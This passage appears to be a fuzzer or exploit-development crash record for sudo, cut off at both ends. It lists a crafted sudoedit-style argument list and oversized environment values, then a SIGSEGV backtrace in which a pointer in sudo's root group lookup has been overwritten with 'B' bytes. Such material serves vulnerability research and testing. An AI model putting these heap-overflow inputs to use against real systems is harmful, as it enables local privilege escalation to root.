</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;./////0edit&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-hB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-i&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAAAAAAA\\&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBB&#34;</span>
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;env&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;PWNLIB_NOTERM&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;PATH&#34;</span>: <span style=color:#e6db74>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;HOME&#34;</span>: <span style=color:#e6db74>&#34;/root&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;LC_CTYPE&#34;</span>: <span style=color:#e6db74>&#34;C.UTF-8&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;TZ&#34;</span>: <span style=color:#e6db74>&#34;NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;GCONV_PATH&#34;</span>: <span style=color:#e6db74>&#34;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY&#34;</span>: <span style=color:#e6db74>&#34;000000000000000000000000000000000000000000000000&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;output&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;&lt;omitted&gt;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;reason&#34;</span>: <span style=color:#e6db74>&#34;SIGSEGV&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;context&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;env&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;PWNLIB_NOTERM&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;PATH&#34;</span>: <span style=color:#e6db74>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;HOME&#34;</span>: <span style=color:#e6db74>&#34;/root&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;LC_CTYPE&#34;</span>: <span style=color:#e6db74>&#34;C.UTF-8&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;TZ&#34;</span>: <span style=color:#e6db74>&#34;NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;GCONV_PATH&#34;</span>: <span style=color:#e6db74>&#34;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY&#34;</span>: <span style=color:#e6db74>&#34;000000000000000000000000000000000000000000000000&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;LINES&#34;</span>: <span style=color:#e6db74>&#34;24&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;COLUMNS&#34;</span>: <span style=color:#e6db74>&#34;80&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;bt&#34;</span>: [
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#0  __nss_module_get_function (module=0x4242424242422042, name=name@entry=0x7ffff7f52525 \&#34;initgroups_dyn\&#34;) at ./nss/nss_module.c:336&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;0&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;__nss_module_get_function&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;module=0x4242424242422042&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;name=name@entry=0x7ffff7f52525 \&#34;initgroups_dyn\&#34;&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./nss/nss_module.c:336&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#1  0x00007ffff7eecfad in __GI___nss_lookup_function (ni=&lt;optimized out&gt;, fct_name=fct_name@entry=0x7ffff7f52525 \&#34;initgroups_dyn\&#34;) at ./nss/nsswitch.c:137&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7eecfad&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;__GI___nss_lookup_function&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;ni=&lt;optimized out&gt;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;fct_name=fct_name@entry=0x7ffff7f52525 \&#34;initgroups_dyn\&#34;&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./nss/nsswitch.c:137&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#2  0x00007ffff7e8bb8c in internal_getgrouplist (user=user@entry=0x55555558ce88 \&#34;root\&#34;, group=group@entry=0, size=size@entry=0x7fffffffd198, groupsp=groupsp@entry=0x7fffffffd1a0, limit=limit@entry=-1) at ./grp/initgroups.c:95&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;2&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7e8bb8c&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;internal_getgrouplist&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;user=user@entry=0x55555558ce88 \&#34;root\&#34;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;group=group@entry=0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;size=size@entry=0x7fffffffd198&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;groupsp=groupsp@entry=0x7fffffffd1a0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;limit=limit@entry=-1&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./grp/initgroups.c:95&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#3  0x00007ffff7e8be28 in getgrouplist (user=0x55555558ce88 \&#34;root\&#34;, group=0, groups=0x7ffff7c5e010, ngroups=0x7fffffffd204) at ./grp/initgroups.c:156&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;3&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7e8be28&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;getgrouplist&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;user=0x55555558ce88 \&#34;root\&#34;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;group=0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;groups=0x7ffff7c5e010&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;ngroups=0x7fffffffd204&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./grp/initgroups.c:156&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#4  0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558ce88 \&#34;root\&#34;, basegid=0, groupsp=0x7fffffffd260, ngroupsp=0x7fffffffd254) at ./getgrouplist.c:105&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;4&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7fafde6&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudo_getgrouplist2_v1&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;name=0x55555558ce88 \&#34;root\&#34;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;basegid=0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;groupsp=0x7fffffffd260&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;ngroupsp=0x7fffffffd254&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./getgrouplist.c:105&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#5  0x00007ffff7d3b953 in sudo_make_gidlist_item (pw=0x55555558ce58, unused1=0x0, type=1) at ./pwutil_impl.c:272&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;5&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d3b953&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudo_make_gidlist_item&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;pw=0x55555558ce58&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;unused1=0x0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;type=1&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./pwutil_impl.c:272&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#6  0x00007ffff7d3a367 in sudo_get_gidlist (pw=0x55555558ce58, type=1) at ./pwutil.c:932&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;6&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d3a367&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudo_get_gidlist&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;pw=0x55555558ce58&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;type=1&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./pwutil.c:932&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#7  0x00007ffff7d32683 in runas_getgroups () at ./match.c:145&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;7&#34;</span>,
